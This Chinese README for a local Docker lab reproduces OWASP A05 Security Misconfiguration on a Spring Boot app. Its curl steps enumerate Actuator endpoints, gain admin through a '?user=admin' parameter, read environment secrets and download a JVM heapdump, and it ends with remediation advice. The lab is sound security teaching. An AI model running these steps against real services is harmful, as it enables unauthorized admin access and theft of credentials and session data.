# A05: Security Misconfiguration（安全配置错误）


## 项目概述

本项目用于复现 OWASP Top 10 中的 \*\*A05: Security Misconfiguration\*\* 漏洞。  

通过 Spring Boot Actuator 暴露的调试接口、环境信息及管理接口，演示了生产环境中常见的安全配置错误及其风险。


## 环境要求

\- Docker: 4.65.0

\- Python 3.x（用于自动抓取 Actuator JSON）

\- PowerShell 或 curl 命令行工具

\- 可选：jq（用于 JSON 格式化，可选）


## 项目结构

### A05_Security_Misconfiguration/

| 目录/文件 | 说明 |
|----------|------|
| `environment/` | Docker 启动配置文件 |
| ├─ `Dockerfile` | |
| ├─ `docker-compose.yml` | |
| └─ `...` | 其他环境配置 |
| `exploit/` | 漏洞复现脚本 |
| ├─ `scripts/` | curl / python 脚本 |
| └─ `output/` | 抓取的 actuator JSON 输出 |
| `vulnerability/` | 漏洞说明 |
| ├─ `analysis.md` | |
| ├─ `exploit.md` | |
| └─ `README.md` | |
| `screenshots/` | 截图 |
| `README.md` | 项目总说明 |


## 漏洞复现步骤


1\. 启动环境

```bash
cd environment
docker-compose up --build
```

确认服务在 http://localhost:8085 上正常启动<br />
<br />

2\. 枚举 Actuator 接口

使用 Python 脚本或 curl 抓取：

```bash
python exploit/scripts/fetch\_actuator.py
```

或者

```bash
curl http://localhost:8085/actuator
```

输出文件将保存在 exploit/output/actuator.json<br />
<br />

3\. 查找敏感接口

检查 actuator JSON 文件，发现以下敏感接口：

- /admin （管理面板）
- /debug （调试信息）
- /env （环境变量）
- /heapdump （JVM 内存快照）<br />
<br />

4\. 权限绕过

访问 /admin：

```bash
curl http://localhost:8085/admin
```
返回：

```bash
Admin Panel Access : guest
```

通过 URL 参数提升权限：

```bash
curl "http://localhost:8085/admin?user=admin"
```

返回：

```bash
Admin Panel Access : admin
```

说明管理接口 未授权访问，参数可控制角色。<br />
<br />

5\. 信息泄露

访问调试接口：

```bash
curl http://localhost:8085/debug
```

返回环境变量和运行信息，例如：

```bash
PATH, JAVA\_HOME, HOSTNAME, LANGUAGE
```

访问环境配置：

```bash
curl http://localhost:8085/actuator/env
```

可获取数据库密码、API key、内部 token 等敏感信息。<br />
<br />


6\. Heapdump 下载（高危）

可下载完整 JVM 内存：

```bash
curl http://localhost:8085/actuator/heapdump -o heapdump.hprof
```

包含 session、token、配置及敏感数据。<br />
注：此操作中会占用大量内存



## 漏洞总结

### 漏洞原因

\- Spring Boot Actuator 端点未在生产环境中关闭

\- 管理接口 /admin 无认证控制

\- Debug 接口未禁用，环境信息暴露

\- 参数信任错误导致权限绕过<br />

### 风险影响

\- 敏感信息泄露（密码、token、内部配置）

\- 管理权限被未授权用户获取

\- 可能进一步导致系统接管或数据泄露<br />

### OWASP 分类

\- A05: Security Misconfiguration（安全配置错误）

## 修复建议

- 禁用或限制 Actuator 端点访问，仅限可信网络或认证用户

- 对管理接口实施严格身份验证与访问控制

- 禁止生产环境开启调试接口 /debug

- 不在 URL 参数中直接信任用户身份信息

- 定期检查生产环境配置，确保默认配置被安全覆盖

## 参考链接

\- OWASP Top 10 - 2021 A05 Security Misconfiguration
\- Spring Boot Actuator 官方文档
